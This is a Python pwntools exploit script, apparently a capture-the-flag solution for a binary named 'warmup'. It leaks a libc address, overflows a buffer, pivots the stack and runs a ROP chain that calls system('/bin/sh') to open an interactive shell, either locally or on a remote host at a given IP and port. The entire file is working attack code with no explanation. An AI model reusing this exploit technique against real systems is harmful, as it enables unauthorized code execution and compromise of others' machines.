#!/usr/bin/python3

from pwn import *

exe = ELF('warmup_patched', checksec=False)
libc = ELF("libc.so.6")
context.binary = exe


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)
def sln(msg, num): return sla(msg, str(num).encode())
def sn(msg, num): return sa(msg, str(num).encode())


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*0x0401276
        b* 0x40124F 
        c
        ''')
        input()


if args.REMOTE:
    p = remote('172.210.129.230', 1338)
else:
    p = process(exe.path)
GDB()
libc.address = int(p.recvline()[:-1], 16) - libc.sym.puts
pop_rdi = libc.address + 0x000000000010f75b
pop_rsi = libc.address + 0x0000000000110a4d
pop_rdx = libc.address + 0x000000000009819d
pop_rbp = 0x000000000040116d
pop_rsp = 0x000000000003c058 + libc.address
stdin = libc.sym._IO_2_1_stdin_
pa = b'a'*0x100 + flat(0, pop_rbp, 0x404800, 0x401254)
pa1 = b'a'*64 + flat(0x404060+0x100, 0x0000000000401280)
pa2 = flat(pop_rdi, next(libc.search(b'/bin/sh')),
           libc.sym.system).ljust(64) + flat(0, pop_rsp, 0x4047c0)
sla(b'name>> ', pa)
sla(b'>> ', pa1)
input()
sl(pa2)
p.interactive()
